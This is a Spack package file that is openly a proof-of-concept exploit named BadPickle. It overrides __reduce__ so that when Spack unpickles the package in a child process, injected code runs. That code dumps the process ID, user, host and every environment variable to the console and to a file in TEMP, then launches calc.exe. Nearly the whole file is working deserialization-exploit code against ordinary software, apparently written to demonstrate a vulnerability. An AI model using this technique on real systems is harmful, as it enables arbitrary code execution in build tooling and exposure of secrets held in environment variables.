import os
import pickle
import threading
from spack.package import *

MARKER = os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"), "spack_poc.txt")


def _restore(real_pkg_bytes):
    # Runs inside spack's child process on pickle.load().
    # Collect PID, TID, and env from within the spack process itself.
    pid = os.getpid()
    tid = threading.current_thread().ident
    env = os.environ.copy()

    lines = [
        f"PID  : {pid}",
        f"TID  : {tid}",
        f"USER : {env.get('USERNAME', env.get('USER', '?'))}",
        f"HOST : {env.get('COMPUTERNAME', env.get('HOSTNAME', '?'))}",
        "",
        "--- exports (os.environ) ---",
    ]
    for k, v in sorted(env.items()):
        lines.append(f"{k}={v}")

    report = "\n".join(lines)
    print(report, flush=True)

    with open(MARKER, "w", encoding="utf-8") as f:
        f.write(report + "\n")

    # Launch calc directly via ShellExecute (no cmd.exe, no subprocess shell).
    # os.startfile maps 1:1 to ShellExecuteW - calc runs detached from our process.
    os.startfile("calc.exe")

    return pickle.loads(real_pkg_bytes)


class BadPickle(Package):
    homepage = "https://spack.readthedocs.io"
    url      = "https://github.com/spack/spack/archive/refs/heads/develop.tar.gz"

    version("1.0", sha256="c25ece3a09410d76252f34144c7895853007b72f54d6eef697fbb316f53a3a1f")

    def __reduce__(self):
        cls = type(self)
        orig = cls.__reduce__
        del cls.__reduce__
        try:
            real_bytes = pickle.dumps(self)
        finally:
            cls.__reduce__ = orig
        return (_restore, (real_bytes,))

    def install(self, spec, prefix):
        mkdirp(prefix.bin)
